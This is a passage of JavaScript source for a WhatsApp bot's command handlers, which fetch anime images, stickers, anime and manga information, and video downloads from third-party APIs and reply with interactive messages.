  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'catmeow': {
await VeranStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                }
break

//MEW ANIME CMDS
//----------------------------------------------------------------------------------------------//


case 'bilibili': {
  if (!isPremium) return replyprem(mess.premium)
  if (!text) return replygcveran(`Example : ${prefix + command} https://www.bilibili.com/video/BV1cy4y1k7A2`);

  try {
    // Fetch video information from Bilibili API
    var response = await fetch(`${global.api}downloader/bilibili?apikey=${global.id}&url=${encodeURIComponent(text)}`);
    
    if (!response.ok) {
      return replygcveran('❌ API request failed. Please check the URL and try again.');
    }

    var json = await response.json();
    console.log('API Response:', json); // Log the full API response

    // Check if the response contains video data
    if (json.status !== 200 || !json.result || !json.result.medias || json.result.medias.length === 0) {
      return replygcveran('❌ No video found. Please check the URL and try again.');
    }

    // Choose the best quality video available
    const video = json.result.medias.find(media => media.videoAvailable) || json.result.medias[0];
    const videoUrl = video.url;

    // Prepare message with video
    let caption = `
      📹 *Bilibili Video Downloaded*
      
      📂 Title: ${json.result.title}
      📅 Duration: ${json.result.duration}
      👤 Uploader: ${json.result.uploader}
      
      🔗 Download Link: ${videoUrl}
    `;

    // Send message with video attachment
    let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: caption
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: true,
              ...await prepareWAMessageMedia({ video: { url: videoUrl }}, { upload: VeranBotInc.waUploadToServer })
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"🔄 Refresh\",\"id\":\"\"}`
              }],
            }),
            contextInfo: {
              mentionedJid: [m.sender], 
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '100000000000000000@newsletter',
                newsletterName: ownername,
                serverMessageId: 143
              }
            }
          })
        }
      }
    }, { quoted: m });

    await VeranBotInc.relayMessage(m.chat, msgs.message, {});
  } catch (error) {
    console.error('Failed to fetch video:', error);
    replygcveran('❌ An error occurred while fetching the video. Please try again later.');
  }
}
break;


case 'dailymotion': {
  if (!isPremium) return replyprem(mess.premium)
  if (!text) return replygcveran(`Example : ${prefix + command} https://dai.ly/x9492ja`);

  try {
    // Ensure global.api is an absolute URL
    const apiUrl = new URL(`${global.api}downloader/dailymotion?apikey=${global.id}&url=${encodeURIComponent(text)}`);


    // Fetch video information from Dailymotion API
    const response = await fetch(apiUrl.toString());
    const json = await response.json();

    // Check if the response contains video data
    if (!json || !json.result || !json.result.medias || json.result.medias.length === 0) {
      return replygcveran('❌ Failed to fetch video. Please try again.');
    }

    // Choose the best quality video available
    const video = json.result.medias.find(media => media.quality === '360') || json.result.medias[0];
    const videoUrl = video.url;

    // Send a reaction to indicate the start of the download
    await VeranBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    // Send the video
    await VeranBotInc.sendMessage(m.chat, { video: { url: videoUrl }, caption: `📹 *Dailymotion Video Downloaded*\n\n📂 Title: ${json.result.title}\n📅 Duration: ${json.result.duration}\n🌐 Source: ${json.result.source}\n\n🔗 Download Link: ${videoUrl}` }, { quoted: m });

    // Send a reaction to indicate the download is complete
    await VeranBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

  } catch (err) {
    console.error(err);
    await VeranBotInc.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
    replygcveran('❌ An error occurred while fetching the video. Please try again later.');
  }
}
break;


case 'animeinfo': {
  if (!text) return replygcveran(`Which anime are you looking for?`);

  const fetchAnimeInfo = async (animeName) => {
    const api = `https://abra.abrahamdw882.workers.dev/search/${encodeURIComponent(animeName)}`;

    try {
      const response = await fetch(api);
      if (!response.ok) {
        console.error(`API response not OK: ${response.status} ${response.statusText}`);
        throw new Error('API response not OK');
      }
      const json = await response.json();
      if (json.results && json.results.length > 0) {
        return json.results; // Return results if found
      } else {
        console.error('No results found in API response');
      }
    } catch (error) {
      console.error(`Error fetching from ${api}:`, error);
    }
    return null; // Return null if no results found
  };

  await VeranStickWait();
  const animeName = text.trim();
  const results = await fetchAnimeInfo(animeName);

  if (!results) {
    return replygcveran('❌ Failed to fetch anime information. Please try again.');
  }

  let animetxt = `Anime Information for *"${animeName}"*:\n\n`;
  results.forEach(anime => {
    animetxt += `
🎀 *Title:* ${anime.title}
🎋 *Release Date:* ${anime.releaseDate}
🆔 *ID:* ${anime.id}
🌐 *Link:* ${anime.link}
🖼️ *Image:* ${anime.img}\n\n`;
  });

  let msgs = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${animeName}*_\n\n${animetxt}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false,
            ...await prepareWAMessageMedia({ image: { url: results[0].img }}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
              "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}` 
            }],
          }), 
          contextInfo: {
            mentionedJid: [m.sender], 
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: '100000000000000000@newsletter',
              newsletterName: ownername,
              serverMessageId: 143
            }
          }
        })
      }
    }
  }, { quoted: m });

  return await VeranBotInc.relayMessage(m.chat, msgs.message, {});
}
break;
               

case 'sendanimeid': {
  if (!text) return replygcveran(`Please provide the anime name to fetch IDs.`);

  const fetchAnimeIds = async (animeName) => {
    const api = `https://abra.abrahamdw882.workers.dev/search/${encodeURIComponent(animeName)}`;

    try {
      const response = await fetch(api);
      if (!response.ok) {
        console.error(`API response not OK: ${response.status} ${response.statusText}`);
        throw new Error('API response not OK');
      }
      const json = await response.json();
      if (json.results && json.results.length > 0) {
        return json.results.map(anime => ({ id: anime.id, title: anime.title })); // Return list of anime IDs and titles
      } else {
        console.error('No results found in API response');
      }
    } catch (error) {
      console.error(`Error fetching from ${api}:`, error);
    }
    return null; // Return null if no results found
  };

  await VeranStickWait();
  const animeName = text.trim();
  const animeData = await fetchAnimeIds(animeName);

  if (!animeData) {
    return replygcveran('❌ Failed to fetch anime IDs. Please try again.');
  }

  if (animeData.length === 0) {
    return replygcveran(`No anime IDs found for "${animeName}".`);
  }

  // Generate detailed text with title first, then ID
  let idText = `🎌 *Anime IDs for "${animeName}"* 🎌\n\n`;
  animeData.forEach((anime, index) => {
    idText += `🎥 *Title:* ${anime.title}\n🆔 *ID:* ${anime.id}\n\n`;
  });

  // Send the detailed ID and title list
  await VeranBotInc.sendMessage(m.chat, { text: idText });
}
break;

                
                
                
case 'searchmanga': {
  const title = text.trim(); // Assuming 'text' contains the user's input for the manga title
  if (!title) {
    await VeranBotInc.sendMessage(m.chat, { text: 'Please provide a manga title to search for.' }, { quoted: m });
    return;
  }

  const baseUrl = 'https://api.mangadex.org';
  try {
    const resp = await axios({
      method: 'GET',
      url: `${baseUrl}/manga`,
      params: {
        title: title
      }
    });

    if (resp.data.data.length === 0) {
      await VeranBotInc.sendMessage(m.chat, { text: 'No manga found with that title.' }, { quoted: m });
      return;
    }

    const mangaIds = resp.data.data.map(manga => manga.id);
    let statsMessage = 'Manga Statistics:\n';

    for (const mangaID of mangaIds) {
      const statsResp = await axios({
        method: 'GET',
        url: `${baseUrl}/statistics/manga/${mangaID}`
      });

      const { rating, follows } = statsResp.data.statistics[mangaID];
      const coverUrl = `https://uploads.mangadex.org/covers/${mangaID}.png`;

      statsMessage += `
        Manga ID: ${mangaID}
        Mean Rating: ${rating.average}
        Bayesian Rating: ${rating.bayesian}
        Follows: ${follows}
        Cover Image: ${coverUrl}
      `;
    }

    await VeranBotInc.sendMessage(m.chat, { text: statsMessage }, { quoted: m });
  } catch (error) {
    console.error('Error fetching manga:', error.message);
    await VeranBotInc.sendMessage(m.chat, { text: 'An error occurred while searching for the manga. Please try again later.' }, { quoted: m });
  }
}
break;
                
case 'animedl': {
  if (!isPremium) return replyprem(mess.premium);
  if (!text) return replygcveran(`Example: ${prefix + command} one-piece,1;low`);

  try {
    const [animeInfo, quality] = text.split(';');
    const [animeId, episode] = animeInfo.split(',');

    if (!animeId || !episode) {
      return replygcveran('Invalid format. Please use: .animedl <anime-id>,<episode-number>;<quality-optional>');
    }

    const selectedQuality = quality?.trim()?.toLowerCase() || 'low';
    let videoQuality;

    switch (selectedQuality) {
      case 'low':
        videoQuality = '640x360';
        break;
      case 'medium':
        videoQuality = '854x480';
        break;
      case 'high':
        videoQuality = '1280x720';
        break;
      case 'ultra':
        videoQuality = '1920x1080';
        break;
      default:
        return replygcveran('Invalid quality option. Available options: low, medium, high, ultra.');
    }

    const formattedText = `${animeId.trim()}-episode-${episode.trim()}`;
    const apiUrls = [
      `https://api2.abrahamdw882.workers.dev/download/${formattedText}`,
      `https://abra.abrahamdw882.workers.dev/download/${formattedText}`,
      `https://api1.toontamilindia.workers.dev/download/${formattedText}`
    ];

    let json = null;
    let videoUrl = null;

    for (let apiUrl of apiUrls) {
      try {
        const response = await fetch(apiUrl);
        if (response.ok) {
          json = await response.json();
          console.log('API Response:', json);

          if (json.results && json.results[videoQuality]) {
            videoUrl = json.results[videoQuality];
            break;
          }
        }
      } catch (error) {
        console.warn(`Failed to fetch from ${apiUrl}:`, error);
      }
    }

    if (!videoUrl) {
      return replygcveran('❌ No video found after trying all APIs. Please check the ID, episode number, and try again.');
    }

    const animeName = animeId.replace(/-/g, ' ');
    const language = animeId.includes('dub') ? 'English' : 'Japanese';
    const caption = `
📹 *Anime Video Downloaded*

🌐 *Anime Website:* _Gogoanime_
📂 *Anime Name:* _${animeName}_
📅 *Episode No:* _${episode.trim()}_
🆔 *Episode Id:* _${formattedText}_
📺 *Quality:* _${selectedQuality.charAt(0).toUpperCase() + selectedQuality.slice(1)}_
🌐 *Language:* _${language}_
📜 *Subtitles Language:* _English_
💻 *Server:* _Kali Linux_
📅 *Download Date:* _${new Date().toLocaleDateString()}_
⏰ *Download Time:* _${new Date().toLocaleTimeString()}_
📥 *Downloaded By:* _VERAN-TECH-BOT_
👤 *Feature By:* _Salman Ahmad_

    `;

    await VeranBotInc.sendMessage(m.chat, { react: { text: "⏱️", key: m.key } });

    let msgs = generateWAMessageFromContent(m.chat, {
      viewOnceMessage: {
        message: {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.create({
            body: proto.Message.InteractiveMessage.Body.create({
              text: caption
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: botname
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: true,
              ...await prepareWAMessageMedia({ video: { url: videoUrl }}, { upload: VeranBotInc.waUploadToServer })
            }),
            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
              buttons: [{
                "name": "quick_reply",
                "buttonParamsJson": `{\"display_text\":\"🔄 Refresh\",\"id\":\"\"}`
              }],
            }),
            contextInfo: {
              mentionedJid: [m.sender],
              forwardingScore: 999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: '100000000000000000@newsletter',
                newsletterName: ownername,
                serverMessageId: 143
              }
            }
          })
        }
      }
    }, { quoted: m });

    await VeranBotInc.relayMessage(m.chat, msgs.message, { messageId: msgs.key.id });

    await VeranBotInc.sendMessage(m.chat, { react: { text: "☑️", key: m.key } });

  } catch (error) {
    console.error('Failed to fetch video:', error);
    await VeranBotInc.sendMessage(m.chat, { react: { text: "✖️", key: m.key } });
    replygcveran('❌ An error occurred while fetching the video. Please try again later.');
  }
}
break;   
                
case 'mangaimg': {
    if (!text) return replygcveran(`*• Example:* ${prefix + command} a manga character`);
    try {
        // Fetch the manga image from the API
        let apiUrl = `${global.api}ai/manga-diffusion?apikey=${global.id}&prompt=${encodeURIComponent(text)}`;
        let response = await fetch(apiUrl);

        // Check if the response is okay
        if (!response.ok) {
            return replygcveran('❌ Failed to fetch the image. Please try again.');
        }

        // Convert the response to a buffer
        const buffer = await response.buffer();

        // Prepare the message to send
        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `> Manga Image\n\n_*Here is the result of: ${text}*_`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            ...await prepareWAMessageMedia({ image: buffer }, { upload: VeranBotInc.waUploadToServer })
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender],
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '100000000000000000@newsletter',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        // Send the message
        await VeranBotInc.relayMessage(m.chat, msgs.message, {});
    } catch (e) {
        console.error(e);
        return replygcveran("❗ Error fetching the image. Please try again.");
    }
}
break;

case 'animeimg': {
    if (!text) return replygcveran(`*• Example:* ${prefix + command} a cute anime girl`);
    try {
        // Fetch the anime image from the API
        let apiUrl = `${global.api}ai/anime-gen?apikey=${global.id}&prompt=${encodeURIComponent(text)}`;
        let response = await fetch(apiUrl);

        // Check if the response is okay
        if (!response.ok) {
            return replygcveran('❌ Failed to fetch the image. Please try again.');
        }

        // Convert the response to a buffer
        const buffer = await response.buffer();

        // Prepare the message to send
        let msgs = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    "messageContextInfo": {
                        "deviceListMetadata": {},
                        "deviceListMetadataVersion": 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: `> Anime Image\n\n_*Here is the result of: ${text}*_`
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({
                            text: botname
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            hasMediaAttachment: true,
                            ...await prepareWAMessageMedia({ image: buffer }, { upload: VeranBotInc.waUploadToServer })
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [{
                                "name": "quick_reply",
                                "buttonParamsJson": `{\"display_text\":\"Nice 👀\",\"id\":\"\"}`
                            }],
                        }),
                        contextInfo: {
                            mentionedJid: [m.sender],
                            forwardingScore: 999,
                            isForwarded: true,
                            forwardedNewsletterMessageInfo: {
                                newsletterJid: '100000000000000000@newsletter',
                                newsletterName: ownername,
                                serverMessageId: 143
                            }
                        }
                    })
                }
            }
        }, { quoted: m });

        // Send the message
        await VeranBotInc.relayMessage(m.chat, msgs.message, {});
    } catch (e) {
        console.error(e);
        return replygcveran("❗ Error fetching the image. Please try again.");
    }
}
break;
                
               
//--------------------------------------------------------------------------------------------//
case 'searchanime': {
if (!text) return replygcveran(`Which anime are you lookin for?`)
const malScraper = require('mal-scraper')
await VeranStickWait()
        const anime = await malScraper.getInfoFromName(text).catch(() => null)
        if (!anime) return replygcveran(`Could not find`)
let animetxt = `
🎀 *Title:* ${anime.title}
🎋 *Type:* ${anime.type}
🎐 *Premiered on:* ${anime.premiered}
💠 *Total Episodes:* ${anime.episodes}
📈 *Status:* ${anime.status}
💮 *Genres:* ${anime.genres}
📍 *Studio:* ${anime.studios}
🌟 *Score:* ${anime.score}
💎 *Rating:* ${anime.rating}
🏅 *Rank:* ${anime.ranked}
💫 *Popularity:* ${anime.popularity}
♦️ *Trailer:* ${anime.trailer}
🌐 *URL:* ${anime.url}
❄ *Description:* ${anime.synopsis}`
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${text}*_\n\n${animetxt}`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:anime.picture}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"🌿\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
                
                }
                break
                




			case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
 
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await VeranBotInc.relayMessage(m.chat, msgs.message, {})
            }
            break
			case 'traceanime': {
	try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || q.mediaType || "";
    if (!mime.startsWith('image')) {
      return replygcveran("*Respond to an image*");
    }
    let data = await q.download();
    let image = await uploadImage(data);
    let apiUrl = `https://api.trace.moe/search?anilistInfo&url=${encodeURIComponent(image)}`;
    console.log("API URL:", apiUrl);
    let response = await fetch(apiUrl);
    let result = await response.json();
    console.log("API Response:", result);
    if (!result || result.error || result.result.length === 0) {
      return replygcveran("*Error: Could not track the anime.*");
    }
    let { anilist, from, to, similarity, video, episode } = result.result[0];
    let animeTitle = anilist.title ? anilist.title.romaji || anilist.title.native : "Unknown Title";
    let message = `*Anime:* ${animeTitle}\n`;
    if (anilist.synonyms && anilist.synonyms.length > 0) {
      message += `*Synonyms:* ${anilist.synonyms.join(", ")}\n`;
    }
    message += `*Similarity:* ${similarity.toFixed(2)}%\n`;
    message += `*Time:* ${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}\n`;
    if (episode) {
      message += `*Episode:* ${episode}\n`;
    }
    console.log("Anime Information:", {
      animeTitle,
      synonyms: anilist.synonyms ? anilist.synonyms.join(", ") : "Not Available",
      similarity,
      timestamp: `${formatDuration(from * 1000)} - ${formatDuration(to * 1000)}`,
      video,
      episode,
    });
    // Send the video with anime information as the caption
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: message
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video: {url: video}}, { upload: VeranBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"👀\",\"id\":\"\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '100000000000000000@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
await VeranBotInc.relayMessage(m.chat, msgs.message, {})
  } catch (error) {
    console.error("Error:", error);
    replygcveran("*Error: Could not track the anime or send the video.*");
  }
};
break
			case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
VeranBotInc.sendImageAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
